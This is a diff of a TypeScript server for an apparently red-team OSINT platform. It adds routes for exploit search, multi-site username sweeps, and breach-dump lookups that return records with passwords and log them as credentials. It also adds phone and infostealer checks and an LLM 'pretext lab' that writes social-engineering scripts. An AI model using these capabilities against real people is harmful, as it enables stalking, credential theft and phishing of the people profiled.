+    if (existsSync(filePath)) {
+      const raw = await readFile(filePath, 'utf8');
+      const lines = raw.split(/\r?\n/);
+      const out = lines.filter(l => {
+        const t = l.trim();
+        if (!t || t.startsWith('#')) return true;
+        const k = t.split('=')[0]?.trim();
+        return k !== envVar;
+      }).join('\n');
+      const normalized = out.endsWith('\n') ? out : out + '\n';
+      await writeFile(filePath, normalized, 'utf8');
+    }
+    delete process.env[envVar];
+    // HuggingFace aliases
+    if (provider === 'huggingface') {
+      delete process.env.HUGGINGFACE_API_KEY;
+      delete process.env.HUGGINGFACE_TOKEN;
+      delete process.env.HUGGINGFACEHUB_API_TOKEN;
+    }
+    if (provider === 'local') {
+      delete process.env.ZAI_API_KEY;
+      delete process.env.ZHIPUAI_API_KEY;
+    }
+    if (provider === 'ollama') {
+      delete process.env.OLLAMA_API_KEY;
+    }
+    try { (config as any).removeApiKey?.(provider); } catch { /* ignore */ }
+    console.log(`[config:env] ${provider} (${envVar}) removed from ${filePath}`);
+    res.json({ ok: true, provider, envVar, file: filePath });
+  } catch (e) {
+    res.status(500).json({ error: String((e as Error).message || e) });
+  }
+});
+
 app.get('/api/llm/status', (_req: Request, res: Response) => {
   const llmConfig = config.getLLMConfig();
   res.json({
@@ -6293,60 +7795,2663 @@ app.post('/api/tools/recon', async (req: Request, res: Response): Promise<void> 
   res.json({ success: true, target: targetHost, scan_type, approvalId: guard.approval?.id || null, results: { dns, ports } });
 });
 
-// Passive OSINT quick-look (direction-picker cards): runs ONE read-only OSINT
-// tool (username_search / telegram_lookup / email_format / ip_info) directly.
-// These are passive lookups of public data — no target network action, no
-// approval needed (the same posture as the MCP security_recon surface).
-const OSINT_QUICK_TOOLS = new Set(['username_search', 'telegram_lookup', 'email_format', 'ip_info']);
-app.post('/api/osint/quick', async (req: Request, res: Response): Promise<void> => {
+app.post('/api/tools/sploitus', async (req: Request, res: Response): Promise<void> => {
   const body = req.body as Record<string, unknown>;
-  const toolName = String(body.tool || '').trim();
-  if (!OSINT_QUICK_TOOLS.has(toolName)) {
-    res.status(400).json({ error: `Unknown OSINT tool '${toolName}' (allowed: ${[...OSINT_QUICK_TOOLS].join(', ')})` });
+  const query = typeof body.query === 'string' ? body.query : '';
+  const type = (body.type === 'tools' ? 'tools' : 'exploits') as 'exploits' | 'tools';
+  const sort = (body.sort === 'date' || body.sort === 'score' ? body.sort : 'default') as 'default' | 'date' | 'score';
+  const maxResults = typeof body.maxResults === 'number' ? body.maxResults : 10;
+  if (!query || !query.trim()) {
+    res.status(400).json({ error: 'Query parameter required' });
     return;
   }
   try {
-    const mod = await import('./arsenal/social-osint.js');
-    const tool = {
-      username_search: mod.usernameSearchTool,
-      telegram_lookup: mod.telegramLookupTool,
-      email_format: mod.emailFormatTool,
-      ip_info: mod.ipInfoTool,
-    }[toolName];
-    if (!tool) { res.status(400).json({ error: `Unknown OSINT tool '${toolName}'` }); return; }
-    const result = await tool.handler({
-      parameters: (body.parameters ?? {}) as Record<string, string | number | undefined>,
-      target: undefined as never,
-    });
-    res.json(redactSecrets({ success: true, tool: toolName, output: result.output, findings: result.findings ?? [] }));
-  } catch (e) {
-    res.status(500).json({ error: `osint quick-look failed: ${e instanceof Error ? e.message.slice(0, 200) : 'unknown'}` });
+    const data = await SploitusClient.search({ query, type, sort, maxResults });
+    res.json({ success: true, query, total: data.total, results: data.results });
+  } catch (err: any) {
+    res.status(500).json({ error: 'Sploitus query failed: ' + (err?.message || err) });
   }
 });
 
-// Telegram: discover your chat id (message your bot first, then call this).
-app.get('/api/notify/chat-id', async (_req: Request, res: Response) => {
-  const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
-  if (!token) { res.status(400).json({ error: 'TELEGRAM_BOT_TOKEN not set' }); return; }
+// =============================================================================
+// OSINT — PUBLIC-SOURCE PEOPLE LOOKUP, USERNAME SWEEPS, BREACH/DUMP EXPOSURE
+// These are lookups against third-party public services (the same doctrine as the
+// CVE/EPSS feed), not active probes of a target system. Operator-click = operator
+// authorization for the lookup; every run is audit-logged.
+// =============================================================================
+
+app.get('/api/osint/sites', (req: Request, res: Response) => {
+  // The full catalog is the curated entries plus the vendored Sherlock database.
+  // `?catalog=curated` returns the hand-probed subset the old default exposed.
+  const want = String(req.query.catalog || 'full').toLowerCase();
+  const merged = getMergedSiteCatalog();
+  const pool = want === 'curated'
+    ? merged.catalog.filter((s) => s.source === 'curated')
+    : want === 'sherlock'
+      ? merged.catalog.filter((s) => s.source === 'sherlock')
+      : merged.catalog;
+  res.json({
+    sites: pool.map((s) => ({
+      name: s.name,
+      category: s.category,
+      reliability: s.reliability,
+      source: s.source || 'curated',
+      adult: Boolean(s.adult),
+      notes: s.notes,
+    })),
+    count: pool.length,
+    tools: [...OSINT_TOOLS, ...OSINT_DEEP_TOOLS, ...INFRA_TOOLS, ...GOOGLE_OSINT_TOOLS].map((t) => ({ name: t.name, description: t.description })),
+    sherlock: {
+      source: SHERLOCK_SOURCE,
+      license: SHERLOCK_LICENSE,
+      dataUrl: SHERLOCK_DATA_URL,
+      curated: merged.curatedCount,
+      added: merged.sherlockCount,
+      byErrorType: merged.byErrorType,
+      skipped: merged.skipped,
+    },
+  });
+});
+
+app.get('/api/osint/dump-status', (_req: Request, res: Response) => {
+  // `service` is the SAME string the lane reports its results under, so the
+  // status row and a run result always read identically. `envVars` lists every
+  // name that arms the lane — a key present under an alias must not be reported
+  // as "runtime", which would send the operator hunting for a setting they
+  // already have in their .env.
+  //
+  // EVERY keyed lane belongs in this list, including the OpenCellID cell-site
+  // lane: it is armed the same way, from the same place, and gating it into a
+  // separate `gps` object made it invisible to the counter — so the panel
+  // reported "1/3 armed" while two lanes were in fact live. The `gps` object is
+  // kept below for the Settings page, but it is derived from the same lane entry
+  // so the two can never disagree again.
+  const ocArmed = Boolean(getOpencellidKey());
+  const lanes = [
+    {
+      service: 'LeakCheck Pro v2 (keyed)',
+      key: 'leakcheck' as const,
+      envVars: ['T3MP3ST_LEAKCHECK_KEY', 'LEAKCHECKIO_API_KEY', 'LEAKCHECK_APIKEY'],
+      unlocks: 'full dump records incl. password fields, per-breach attribution and remaining quota (email/username/phone/hash — domain & password search are Enterprise-plan)',
+    },
+    { service: 'DeHashed', key: 'dehashed' as const, envVars: ['T3MP3ST_DEHASHED_KEY'], unlocks: 'deep-web breach search, 40B+ records (email/username)' },
+    { service: 'Snusbase', key: 'snusbase' as const, envVars: ['T3MP3ST_SNUSBASE_KEY'], unlocks: 'dump database search incl. phone lookups' },
+    {
+      service: 'OpenCellID (GPS towers)',
+      key: 'opencellid' as const,
+      envVars: ['T3MP3ST_OPENCELLID_KEY'],
+      unlocks: 'GPS Map 📱 TOWERS layer (cell-site registry, opencellid.org free non-commercial token)',
+    },
+  ];
+  const armed = dumpKeyStatus();
+  const isArmed = (k: 'leakcheck' | 'dehashed' | 'snusbase' | 'opencellid') => (k === 'opencellid' ? ocArmed : armed[k]);
+  const enriched = lanes.map((l) => {
+    const armedNow = isArmed(l.key);
+    // Which env var (if any) supplied the key — reported so the operator can see
+    // which name is actually set instead of guessing between the aliases.
+    const setIn = l.envVars.filter((v) => (process.env[v] || '').trim());
+    return {
+      service: l.service,
+      key: l.key,
+      envVar: l.envVars[0],
+      envVars: l.envVars,
+      setIn,
+      unlocks: l.unlocks,
+      armed: armedNow,
+      source: armedNow ? (setIn.length ? 'env-or-runtime' : 'runtime') : 'none',
+    };
+  });
+  res.json({
+    free: ['LeakCheck public', 'XposedOrNot', 'HIBP Pwned Passwords (k-anonymity)'],
+    lanes: enriched,
+    // Settings page view of the same lane — derived, never independently computed.
+    gps: {
+      opencellid: {
+        armed: ocArmed,
+        envVar: 'T3MP3ST_OPENCELLID_KEY',
+        envVars: ['T3MP3ST_OPENCELLID_KEY'],
+        setIn: enriched.find((l) => l.key === 'opencellid')?.setIn ?? [],
+        source: ocArmed ? (process.env.T3MP3ST_OPENCELLID_KEY ? 'env-or-runtime' : 'runtime') : 'none',
+        unlocks: 'GPS Map 📱 TOWERS layer (cell-site registry, opencellid.org free non-commercial token)',
+      },
+    },
+    allowDirect: !/^(0|false|no|off)$/i.test(process.env.T3MP3ST_OSINT_ALLOW_DIRECT ?? '1'),
+  });
+});
+
+// Arm/clear the deep dump lanes + OSINT intel keys at runtime (persisted to the
+// settings DB — masked in every GET; the raw key never leaves the server). Keys
+// take effect immediately. Blank string clears a lane; omitted field keeps it.
+app.post('/api/osint/dump-keys', (req: Request, res: Response): void => {
+  const body = (req.body || {}) as Record<string, unknown>;
+  const applied: string[] = [];
+  for (const [service, raw] of Object.entries(body)) {
+    if (!isDumpKeyService(service)) continue;
+    const key = typeof raw === 'string' ? raw.trim() : '';
+    setDumpKey(service, key || undefined);
+    applied.push(service);
+    // Persist (opaque blob key) so arming survives restarts without env edits.
+    dbSettings[`osintDumpKeys.${service}`] = key || undefined;
+  }
+  if ('opencellid' in body) {
+    const key = typeof body.opencellid === 'string' ? body.opencellid.trim() : '';
+    setOpencellidKey(key || undefined);
+    dbSettings['osint.opencellidKey'] = key || undefined;
+    applied.push('opencellid');
+  }
+  if ('allowDirect' in body) {
+    const v = body.allowDirect === true || body.allowDirect === '1' || body.allowDirect === 'true';
+    process.env.T3MP3ST_OSINT_ALLOW_DIRECT = v ? '1' : '0';
+    dbSettings['osint.allowDirect'] = v;
+    applied.push('allowDirect');
+  }
+  if (applied.length === 0) { res.status(400).json({ error: 'no recognized keys in body (leakcheck | dehashed | snusbase | opencellid | allowDirect)' }); return; }
+  saveDbSettings('osint.dump-keys.updated');
+  console.log(`[T3MP3ST][OSINT] intel keys updated: ${applied.join(', ')}`);
+  res.json({ success: true, applied, armed: dumpKeyStatus() });
+});
+
+app.post('/api/osint/username-sweep', async (req: Request, res: Response): Promise<void> => {
+  const username = typeof req.body?.username === 'string' ? req.body.username : '';
+  const sites = typeof req.body?.sites === 'string'
+    ? req.body.sites.split(',').map((s: string) => s.trim()).filter(Boolean)
+    : undefined;
+  if (!username) { res.status(400).json({ error: 'username required' }); return; }
   try {
-    const r = await fetch(`https://api.telegram.org/bot${token}/getUpdates`, { signal: AbortSignal.timeout(10000) });
-    const j = (await r.json()) as { ok?: boolean; result?: { message?: { chat?: { id?: number; type?: string; first_name?: string } } }[] };
-    const chats = new Map<number, string>();
-    for (const u of j.result ?? []) {
-      const c = u.message?.chat;
-      if (c && c.id) chats.set(c.id, `${c.type}${c.first_name ? ' ' + c.first_name : ''}`);
+    const name = typeof req.body?.name === 'string' ? req.body.name : undefined;
+    const catalogRaw = typeof req.body?.catalog === 'string' ? req.body.catalog.toLowerCase() : 'full';
+    const catalog = (['curated', 'sherlock', 'full'].includes(catalogRaw) ? catalogRaw : 'full') as 'curated' | 'sherlock' | 'full';
+    const includeAdult = req.body?.includeAdult === true;
+    console.log(`[T3MP3ST][OSINT] username sweep: ${username}${sites ? ` (${sites.length} sites)` : ''} [${catalog}]`);
+    const sweep = await runUsernameSweep(username, { sites, hints: { name }, catalog, includeAdult });
+    for (const hit of sweep.found.slice(0, 20)) {
+      upsertMissionFindingToLedger({
+        title: `Social Account Found — ${hit.site} (${sweep.username})`,
+        description: `Username "${sweep.username}" claimed on ${hit.site}: ${hit.url} (confidence ${hit.confidence}, probe HTTP ${hit.probeStatus ?? '?'})`,
+        severity: 'info',
+        targetId: sweep.username,
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `public-profile probe ${hit.probeStatus ?? '?'} → ${hit.url}`, timestamp: Date.now(), metadata: { tool: 'osint_username_sweep' } }],
+      });
     }
-    if (chats.size) {
-      res.json({ ok: true, chats: [...chats.entries()].map(([id, name]) => ({ id, name })), hint: 'Set T3MP3ST_TG_CHAT_ID=<id> and restart to enable notifications.' });
-    } else {
-      res.json({ ok: false, hint: 'Message your bot first (any text), then call this endpoint again.' });
-    }
-  } catch (e) {
-    res.status(500).json({ error: `getUpdates failed: ${e instanceof Error ? e.message.slice(0, 120) : 'unknown'}` });
+    res.json({ success: true, sweep });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
   }
 });
 
-app.get('/api/tools', (_req: Request, res: Response) => {  res.json({
+// POST /api/osint/username-sweep/deep — the ITERATIVE sweep.
+// The plain sweep above is one-pass: it attaches a handle to every catalog site and stops, which
+// is a search, not an investigation. This route runs the real technique stack: sweep → read the
+// Keybase identity graph and any link hub → harvest the handles those publish → sweep THOSE →
+// cluster every account that shares real evidence. One confirmed account becomes a graph.
+app.post('/api/osint/username-sweep/deep', async (req: Request, res: Response): Promise<void> => {
+  const username = typeof req.body?.username === 'string' ? req.body.username : '';
+  if (!username) { res.status(400).json({ error: 'username required' }); return; }
+  const name = typeof req.body?.name === 'string' ? req.body.name : undefined;
+  const catalogRaw = typeof req.body?.catalog === 'string' ? req.body.catalog.toLowerCase() : 'full';
+  const catalog = (['curated', 'sherlock', 'full'].includes(catalogRaw) ? catalogRaw : 'full') as 'curated' | 'sherlock' | 'full';
+  const includeAdult = req.body?.includeAdult === true;
+  const clampInt = (v: unknown, lo: number, hi: number, dflt: number) => {
+    const n = Number(v);
+    return Number.isFinite(n) ? Math.max(lo, Math.min(hi, Math.trunc(n))) : dflt;
+  };
+  const maxExpansion = clampInt(req.body?.maxExpansionHandles, 0, 25, 8);
+  const rounds = clampInt(req.body?.rounds, 1, 3, 2);
+  const budgetMs = clampInt(req.body?.budgetMs, 30000, 1800000, 240000);
+  console.log(`[T3MP3ST][OSINT] DEEP username sweep: ${username} [${catalog}] rounds=${rounds} expansion=${maxExpansion}`);
+  try {
+    const result = await deepUsernameSweep(username, { name, catalog, includeAdult, maxExpansionHandles: maxExpansion, rounds, budgetMs });
+    // Ledger only the corroborated accounts: an unverified handle match is noise, and a finding
+    // ledger full of "maybe" is how a vault stops being evidence.
+    for (const hit of result.corroborated.slice(0, 20)) {
+      upsertMissionFindingToLedger({
+        title: `Corroborated Social Account — ${hit.site} (@${username})`,
+        description: `Account corroborated against subject name: ${hit.url}`,
+        severity: 'info',
+        targetId: username,
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `corroborated profile → ${hit.url}`, timestamp: Date.now(), metadata: { tool: 'osint_username_deep' } }],
+      });
+    }
+    res.json({ success: true, result, report: formatDeepSweep(result) });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/email', async (req: Request, res: Response): Promise<void> => {
+  const email = typeof req.body?.email === 'string' ? req.body.email : '';
+  if (!email) { res.status(400).json({ error: 'email required' }); return; }
+  try {
+    console.log(`[T3MP3ST][OSINT] email intel: ${email}`);
+    const intel = await emailIntel(email);
+    for (const b of intel.breaches) {
+      if (typeof b.found === 'number' && b.found > 0) {
+        upsertMissionFindingToLedger({
+          title: `Breach Exposure — ${email} (${b.service})`,
+          description: `${b.found} exposed records${b.sources?.length ? ` from: ${b.sources.slice(0, 8).join(', ')}` : ''}${b.fields?.length ? `; fields: ${b.fields.join(', ')}` : ''}`,
+          severity: 'medium',
+          targetId: email,
+          operatorId: 'osint-panel',
+          evidence: [{ type: 'log', content: `${b.service}: ${b.found} records${b.sources?.length ? ` (${b.sources.join('; ')})` : ''}`, timestamp: Date.now(), metadata: { tool: 'osint_email_lookup' } }],
+        });
+      }
+    }
+    res.json({ success: true, intel });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/infostealer', async (req: Request, res: Response): Promise<void> => {
+  const email = typeof req.body?.email === 'string' ? req.body.email : '';
+  if (!email) { res.status(400).json({ error: 'email required' }); return; }
+  try {
+    console.log(`[T3MP3ST][OSINT] infostealer check: ${email}`);
+    const r = await hudsonRockEmail(email);
+    if (r.infected) {
+      upsertMissionFindingToLedger({
+        title: `Infostealer Infection — ${email}`,
+        description: r.infections.map((i) => `${i.family || 'stealer'} on ${i.computerName || '?'} (${i.ip || '?'}) at ${i.date || '?'}${i.software?.length ? `; software: ${i.software.slice(0, 8).join(', ')}` : ''}`).join(' | '),
+        severity: 'high',
+        targetId: email,
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `Hudson Rock: ${r.infections.length} infection record(s); ${r.corporateServices} corporate / ${r.userServices} user services exposed`, timestamp: Date.now(), metadata: { tool: 'osint_infostealer_check' } }],
+      });
+    }
+    res.json({ success: true, infostealer: r });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+// ── Ollama model selection for the OSINT AI features ──
+// The OSINT AI (pretext lab, search director, extraction assist) runs on the
+// operator's own Ollama box. The model is chosen per-request from the live
+// served list and persisted as the remembered default.
+const osintSettings = (): Record<string, unknown> =>
+  (dbSettings.settings && typeof dbSettings.settings === 'object') ? dbSettings.settings as Record<string, unknown> : {};
+
+app.get('/api/osint/local-models', async (_req: Request, res: Response): Promise<void> => {
+  const st = osintSettings() as { localHost?: string; localPort?: string; localPath?: string; localModel?: string };
+  const ep = resolveOllamaEndpoint(st);
+  try {
+    const { models, endpoint, native } = await listOllamaModels(ep);
+    const selected = String(st.localModel || process.env.TEMPEST_LOCAL_MODEL || '');
+    res.json({ success: true, models, endpoint, native, selected });
+  } catch (err: any) {
+    res.status(502).json({ error: 'Ollama unreachable at ' + ep.base + ' — ' + (err?.message || String(err)) });
+  }
+});
+
+app.post('/api/osint/local-model', (req: Request, res: Response): void => {
+  const model = typeof req.body?.model === 'string' ? req.body.model.trim() : '';
+  if (!model) { res.status(400).json({ error: 'model required' }); return; }
+  dbSettings['settings'] = { ...osintSettings(), localModel: model };
+  saveDbSettings('osint.local-model');
+  res.json({ success: true, selected: model });
+});
+
+// ── Social-engineering pretext lab ──
+// Scripted conversation material for AUTHORIZED engagements (phishing simulation,
+// awareness training, red-team playbooks). Every request carries an explicit
+// authorization reference — same scope discipline as the rest of the arsenal —
+// and the scenario is the researcher's own words; no dossier data is injected.
+// Runs on the selected local Ollama model (no cloud fallback — honest errors).
+app.post('/api/osint/pretext', async (req: Request, res: Response): Promise<void> => {
+  const scope = typeof req.body?.scope === 'string' ? req.body.scope.trim() : '';
+  const scenario = typeof req.body?.scenario === 'string' ? req.body.scenario.trim() : '';
+  const context = typeof req.body?.context === 'string' ? req.body.context.trim().slice(0, 400) : undefined;
+  const channel = (SE_CHANNELS as readonly string[]).includes(String(req.body?.channel)) ? req.body.channel as SeChannel : 'email';
+  const objective = (SE_OBJECTIVES as readonly string[]).includes(String(req.body?.objective)) ? req.body.objective as SeObjective : 'credential_test';
+  if (!scope || scope.length < 8) { res.status(400).json({ error: 'authorization reference required (engagement/ticket id + who authorized it) — this lab is for authorized engagements only' }); return; }
+  if (!scenario || scenario.length < 10) { res.status(400).json({ error: 'scenario required (describe the situation in your own words)' }); return; }
+  const st = osintSettings() as { localHost?: string; localPort?: string; localPath?: string; localModel?: string };
+  const model = (typeof req.body?.model === 'string' && req.body.model.trim()) || st.localModel || process.env.TEMPEST_LOCAL_MODEL || '';
+  if (!model) { res.status(503).json({ error: 'no Ollama model selected — pick one in the model dropdown (Settings → Local Model or the OSINT panel)' }); return; }
+  const s: SeScenario = { channel, objective, scope, scenario, context };
+  try {
+    console.log(`[T3MP3ST][OSINT] pretext lab: ${channel}/${objective} via ollama:${model} (scope: ${scope.slice(0, 40)})`);
+    const { content } = await ollamaChat(model, buildPretextSystemPrompt(s), buildPretextUserPrompt(s), resolveOllamaEndpoint(st));
+    const scripts = parsePretextResponse(content || '', s);
+    if (scripts.length === 0) { res.status(502).json({ error: 'model returned no usable scripts — try rephrasing the scenario or a larger model' }); return; }
+    res.json({ success: true, channel, objective, scope, scripts, model });
+  } catch (err: any) {
+    const msg = String(err?.message || err);
+    const slow = /abort|timeout|aborted/i.test(msg);
+    res.status(slow ? 504 : 500).json({
+      error: slow
+        ? 'local model (' + model + ') did not finish in time — the Ollama box is CPU-only and a 3-script generation takes minutes. Pick a smaller model in the dropdown, or a GPU box.'
+        : 'pretext generation failed: ' + msg,
+    });
+  }
+});
+
+app.post('/api/osint/breach-catalog', async (req: Request, res: Response): Promise<void> => {
+  const domain = typeof req.body?.domain === 'string' ? req.body.domain : undefined;
+  try {
+    console.log(`[T3MP3ST][OSINT] breach catalog${domain ? ` (${domain})` : ''}`);
+    const c = await hibpBreachCatalog(domain);
+    if (c.total > 0) {
+      upsertMissionFindingToLedger({
+        title: `Breach Catalogue — ${c.domain || 'all known breaches'} (${c.total})`,
+        description: c.entries.slice(0, 15).map((e) => `${e.name} (${e.breachDate || '?'}, ${e.pwnCount || '?'} accounts)`).join('; '),
+        severity: 'info',
+        targetId: c.domain || 'hibp-catalog',
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `HIBP catalogue: ${c.total} breach(es) via osint_breach_catalog`, timestamp: Date.now(), metadata: { tool: 'osint_breach_catalog' } }],
+      });
+    }
+    res.json({ success: true, catalog: c });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/phone', (req: Request, res: Response) => {
+  const phone = typeof req.body?.phone === 'string' ? req.body.phone : '';
+  if (!phone) { res.status(400).json({ error: 'phone required' }); return; }
+  console.log(`[T3MP3ST][OSINT] phone intel: ${phone}`);
+  try {
+    const intel = phoneIntel(phone);
+    const dorks = phoneInfogaDorks(phone);
+    res.json({ success: true, intel, dorks, dorkStats: { total: dorks.length, social: dorks.filter(d=>d.category==='social').length, disposable: dorks.filter(d=>d.category==='disposable').length, reputation: dorks.filter(d=>d.category==='reputation').length, individuals: dorks.filter(d=>d.category==='individuals').length, general: dorks.filter(d=>d.category==='general').length } });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/phone/scan', async (req: Request, res: Response) => {
+  const phone = typeof req.body?.phone === 'string' ? req.body.phone : '';
+  if (!phone) { res.status(400).json({ error: 'phone required' }); return; }
+  const useRemote = req.body?.remote === undefined ? true : req.body.remote === true;
+  console.log(`[T3MP3ST][OSINT] phone scan (PhoneInfoga${useRemote ? ' + remote' : ''}): ${phone}`);
+  try {
+    const scan = await phoneInfogaScan(phone, { remote: useRemote });
+    upsertMissionFindingToLedger({
+      title: `PhoneInfoga Scan — ${scan.e164}`,
+      description: `${scan.country} ${scan.valid ? 'valid' : 'invalid'}; ${scan.carrier ? `carrier ${scan.carrier}` : 'carrier unknown (numverify not configured)'}${scan.ovh?.found ? `; OVH VoIP ${scan.ovh.city || ''} ${scan.ovh.zipCode || ''}` : ''} — ${scan.dorks.length} dorks`,
+      severity: 'info',
+      targetId: scan.e164,
+      operatorId: 'osint-panel',
+      evidence: [{ type: 'log', content: `PhoneInfoga: ${scan.e164} valid:${scan.valid} ${scan.scanNote}`, timestamp: Date.now(), metadata: { tool: 'osint_phone_scan' } }],
+    });
+    res.json({ success: true, scan });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.get('/api/osint/phone/dorks', (req: Request, res: Response) => {
+  const phone = typeof req.query.phone === 'string' ? req.query.phone : '';
+  if (!phone) { res.status(400).json({ error: 'phone query param required' }); return; }
+  try {
+    const dorks = phoneInfogaDorks(phone);
+    res.json({ success: true, phone, dorks, count: dorks.length });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.get('/api/osint/phone/ovh', async (req: Request, res: Response) => {
+  const phone = typeof req.query.phone === 'string' ? req.query.phone : '';
+  if (!phone) { res.status(400).json({ error: 'phone query param required' }); return; }
+  try {
+    const ovh = await phoneInfogaOvhCheck(phone);
+    res.json({ success: true, ovh });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+// ── Remote PhoneInfoga instance (REST API v2, swagger: web/docs/swagger.yaml) ──
+// Operators who run the real Go binary somewhere (docker/K8s/VPS) can point
+// T3MP3ST at it: T3MP3ST_PHONEINFOGA_URL + optional T3MP3ST_PHONEINFOGA_TOKEN.
+app.get('/api/osint/phoneinfoga/remote', async (_req: Request, res: Response) => {
+  try {
+    res.json({ success: true, remote: await phoneInfogaRemoteInfo() });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/phoneinfoga/remote/scan', async (req: Request, res: Response) => {
+  const phone = typeof req.body?.phone === 'string' ? req.body.phone : '';
+  if (!phone) { res.status(400).json({ error: 'phone required' }); return; }
+  const scanners = Array.isArray(req.body?.scanners)
+    ? req.body.scanners.filter((s: unknown): s is string => typeof s === 'string')
+    : undefined;
+  const dryRun = req.body?.dryRun === true;
+  try {
+    console.log(`[T3MP3ST][OSINT] phoneinfoga remote scan${dryRun ? ' (dry-run)' : ''}: ${phone}`);
+    res.json({ success: true, remote: await phoneInfogaRemoteScan(phone, { scanners, dryRun }) });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+// ── LeakCheck.io — public lane (free, no key) + Pro v2 lane (key-gated) ──
+// https://docs.leakcheck.io/overview. Public returns breach SOURCES + exposed
+// field names only; Pro v2 returns full records. The API key is read from
+// T3MP3ST_LEAKCHECK_KEY / LEAKCHECKIO / LEAKCHECK_APIKEY or the ARM DUMP LANES panel.
+app.post('/api/osint/leakcheck', async (req: Request, res: Response): Promise<void> => {
+  const query = typeof req.body?.query === 'string' ? req.body.query.trim() : '';
+  if (!query) { res.status(400).json({ error: 'query required' }); return; }
+  const typeRaw = typeof req.body?.type === 'string' ? req.body.type.toLowerCase() : 'auto';
+  const type = (['auto', 'email', 'username', 'phone', 'domain', 'hash', 'keyword'] as const).includes(typeRaw as any)
+    ? typeRaw as 'auto' | 'email' | 'username' | 'phone' | 'domain' | 'hash' | 'keyword'
+    : 'auto';
+  const wantPro = req.body?.pro === undefined ? true : req.body.pro === true;
+  try {
+    console.log(`[T3MP3ST][OSINT] leakcheck lookup (${type}${wantPro ? ' + pro' : ''}): ${query}`);
+    const publicSummary = await leakcheckPublic(query);
+    const pro = wantPro ? await leakcheckPro(query, type, { maxRows: 100 }) : null;
+    if (publicSummary.found !== 'unknown' && publicSummary.found > 0) {
+      upsertMissionFindingToLedger({
+        title: `Breach Exposure — ${query} (LeakCheck)`,
+        description: `${publicSummary.found} breach source(s); exposed data classes: ${(publicSummary.fields || []).join(', ') || 'unspecified'}`,
+        severity: (publicSummary.fields || []).some((f) => /password/i.test(f)) ? 'medium' : 'low',
+        targetId: query,
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `LeakCheck public: ${(publicSummary.sources || []).slice(0, 10).join('; ')}`, timestamp: Date.now(), metadata: { tool: 'osint_leakcheck' } }],
+      });
+    }
+    if (pro && !pro.note && pro.found > 0) {
+      const withPw = pro.rows.filter((r) => r.password).length;
+      upsertMissionFindingToLedger({
+        title: `LeakCheck Pro Records — ${query}`,
+        description: `${pro.found} record(s) across ${pro.sources.length} breach source(s); ${withPw} carry password material`,
+        severity: withPw > 0 ? 'high' : 'medium',
+        targetId: query,
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `Top sources: ${pro.sources.slice(0, 8).map((s) => `${s.name}x${s.count}`).join('; ')}`, timestamp: Date.now(), metadata: { tool: 'osint_leakcheck' } }],
+      });
+    }
+    res.json({ success: true, query, type, public: publicSummary, pro });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/breach', async (req: Request, res: Response): Promise<void> => {
+  const query = typeof req.body?.query === 'string' ? req.body.query : '';
+  const kindRaw = typeof req.body?.kind === 'string' ? req.body.kind : '';
+  const kind = (['email', 'username', 'phone', 'password'] as const).includes(kindRaw as any)
+    ? kindRaw as 'email' | 'username' | 'phone' | 'password'
+    : (query.includes('@') ? 'email' : 'username');
+  if (!query) { res.status(400).json({ error: 'query required' }); return; }
+  try {
+    console.log(`[T3MP3ST][OSINT] dump-database lookup (${kind}): ${kind === 'password' ? '<redacted>' : query}`);
+    const result = await dumpDatabaseLookup(query, kind);
+    for (const cred of result.credentials) {
+      recordCredentialToLedger({
+        type: cred.type,
+        username: cred.username,
+        secret: cred.secret,
+        domain: cred.domain,
+        source: cred.source,
+        notes: cred.notes,
+        discoveredAt: new Date().toISOString(),
+      });
+    }
+    res.json({ success: true, result });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/permutate', (req: Request, res: Response) => {
+  const first = typeof req.body?.first === 'string' ? req.body.first : '';
+  const last = typeof req.body?.last === 'string' ? req.body.last : '';
+  if (!first || !last) { res.status(400).json({ error: 'first and last required' }); return; }
+  try {
+    const permutations = usernamePermutations(first, last, {
+      middle: typeof req.body?.middle === 'string' ? req.body.middle : undefined,
+      birthYear: typeof req.body?.birthYear === 'string' ? req.body.birthYear : undefined,
+      numbers: typeof req.body?.numbers === 'boolean' ? req.body.numbers : undefined,
+    });
+    res.json({ success: true, permutations, count: permutations.length });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/dorks', (req: Request, res: Response) => {
+  const dorks = personDorks({
+    name: typeof req.body?.name === 'string' ? req.body.name : undefined,
+    email: typeof req.body?.email === 'string' ? req.body.email : undefined,
+    username: typeof req.body?.username === 'string' ? req.body.username : undefined,
+    phone: typeof req.body?.phone === 'string' ? req.body.phone : undefined,
+    domain: typeof req.body?.domain === 'string' ? req.body.domain : undefined,
+  });
+  // Enrich with Google Dork technique (Recorded Future top-20 operators).
+  try {
+    const g = buildGoogleDorks({
+      name: typeof req.body?.name === 'string' ? req.body.name : undefined,
+      email: typeof req.body?.email === 'string' ? req.body.email : undefined,
+      username: typeof req.body?.username === 'string' ? req.body.username : undefined,
+      phone: typeof req.body?.phone === 'string' ? req.body.phone : undefined,
